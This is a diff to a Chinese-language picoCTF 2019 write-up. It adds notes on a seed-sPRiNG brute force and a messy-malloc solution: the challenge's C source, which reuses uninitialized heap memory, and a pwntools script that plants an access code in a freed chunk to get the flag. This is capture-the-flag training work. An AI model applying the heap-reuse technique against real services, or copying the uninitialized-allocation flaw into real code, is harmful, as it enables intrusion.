@@ -668,7 +668,7 @@ r.recvall()
 picoCTF{A_s0ng_0f_1C3_and_f1r3_2a9d1eaf}
 ## seed-sPRiNG - Points: 350 - (Solves: 420)Binary Exploitation
 ### review
-搞了一個下午  pico 應該是有作弊之類的
+搞了一個下午  pico 應該是有防作弊之類的
 
 你看看 日本人寫的writeup port 是 4160
 
@@ -693,6 +693,9 @@ picoCTF{A_s0ng_0f_1C3_and_f1r3_2a9d1eaf}
 
 後來看了別人的解法 MD 好像要爆破 = =
 
+結果offset 20幾 sec
+
+說好的時間同步ㄋ？？
 ### code
 rand.c
 ```
@@ -747,3 +750,195 @@ for q in range(-100,100):
 ```
 
 picoCTF{pseudo_random_number_generator_not_so_random_829c50d19ba2bdb441975c0dabfcc1c0}
+
+## messy-malloc - Points: 300 - (Solves: 274)Binary Exploitation
+利用 malloc 去要記憶體
+
+然後記憶體會分配在 heap 上
+
+因為優化的關係 如果已經有分配過32byte 大小的chunk 被free過
+
+跟他要一塊 32byte 的話 會給你 剛剛要過得那塊
+
+阿不知道為啥local 不行過 遠端就可以
+
+參考:https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/messy-malloc.md
+
+### code
+```
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <string.h>
+
+#define LINE_MAX 256
+#define ACCESS_CODE_LEN 16
+#define FLAG_SIZE 64
+
+struct user {
+  char *username;
+  char access_code[ACCESS_CODE_LEN]; //16
+  char *files;
+};
+
+struct user anon_user;          //  宣告一個未知使用者
+struct user *u;					//  宣告 user pointer
+
+void print_flag() {
+  char flag[FLAG_SIZE];
+  FILE *f = fopen("flag.txt", "r");
+  if (f == NULL) {
+    printf("Please make sure flag.txt exists\n");
+    exit(0);
+  }
+
+  if ((fgets(flag, FLAG_SIZE, f)) == NULL){
+    puts("Couldn't read flag file.");
+    exit(1);
+  };
+
+  unsigned long ac1 = ((unsigned long *)u->access_code)[0];
+  unsigned long ac2 = ((unsigned long *)u->access_code)[1];
+  if (ac1 != 0x4343415f544f4f52 || ac2 != 0x45444f435f535345) {
+    fprintf(stdout, "Incorrect Access Code: \"");
+    for (int i = 0; i < ACCESS_CODE_LEN; i++) {
+      putchar(u->access_code[i]);
+    }
+    fprintf(stdout, "\"\n");
+    return;
+  }
+
+  puts(flag);
+  fclose(f);
+}
+
+void menu() {   // 就是顯示選單
+  puts("Commands:");
+  puts("\tlogin - login as a user");
+  puts("\tprint-flag - print the flag");
+  puts("\tlogout - log out");
+  puts("\tquit - exit the program");
+}
+
+const char *get_username(struct user *u) {
+  if (u->username == NULL) {   //如果u的username 沒有設定就是預設
+    return "anon";
+  }
+  else {
+    return u->username;
+  }
+}
+
+int login() {
+//  u = malloc(sizeof(struct user));   //要一塊記憶體給 u
+u = (user*)malloc(sizeof(user)); // 加上 (user*)
+  int username_len;
+  puts("Please enter the length of your username");
+  scanf("%d", &username_len);
+  getc(stdin);
+
+  char *username = (char *)malloc(username_len+1);// 加上 (char *)
+  u->username = username;
+
+  puts("Please enter your username");
+  if (fgets(username, username_len, stdin) == NULL) {
+    puts("fgets failed");
+    exit(-1);
+  }
+
+  char *end;
+  if ((end=strchr(username, '\n')) != NULL) {
+    end[0] = '\0';
+  }
+
+  return 0;
+
+}
+
+int logout() {
+  char *user = u->username;
+  if (u == &anon_user) {
+    return -1;
+  }
+  else {
+    free(u); // 清掉 u 所指向的addr
+    free(user);// 清掉 u->username所指向的addr
+    u = &anon_user;
+  }
+  return 0;
+}
+
+int main(int argc, char **argv) {
+
+  setbuf(stdout, NULL);
+
+  char buf[LINE_MAX];
+
+  memset(anon_user.access_code, 0, ACCESS_CODE_LEN); //16  anon_user.access_code set to 0
+  anon_user.username = NULL;
+
+  u = &anon_user;
+
+  menu();
+
+  while(1) {
+    puts("\n Enter your command:");
+    fprintf(stdout, "[%s]> ", get_username(u));
+
+    if(fgets(buf, LINE_MAX, stdin) == NULL)
+      break;
+
+    if (!strncmp(buf, "login", 5)){
+      login();
+    }
+    else if(!strncmp(buf, "print-flag", 10)){
+      print_flag();
+    }
+    else if(!strncmp(buf, "logout", 6)){
+      logout();
+    }
+    else if(!strncmp(buf, "quit", 4)){
+      return 0;
+    }
+    else{
+      puts("Invalid option");
+      menu();
+    }
+  }
+}
+
+```
+```
+from pwn import *
+# context.log_level='debug'
+print(p64(0x4343415f544f4f52))
+print(p64(0x45444f435f535345))
+
+r=remote('2019shell1.picoctf.com', 12286)
+
+raw_input(':')
+r.sendlineafter('>','login')
+r.sendlineafter('username','32')
+payload='a'*8+p64(0x4343415f544f4f52)+p64(0x45444f435f535345)+'a'*8
+# payload='a'*8*0+p64(0x45444f435f535345)+p64(0x4343415f544f4f52)+'a'*8
+
+r.sendlineafter('username',payload)
+r.sendlineafter('>','logout')
+
+
+
+r.sendlineafter('>','login')
+r.sendlineafter('username','1')
+r.sendlineafter('username','a')
+
+
+
+r.sendlineafter('>','print-flag')
+
+
+
+r.interactive()
+
+```
+~~picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8aa9bc45}~~
+picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_406af1a1}
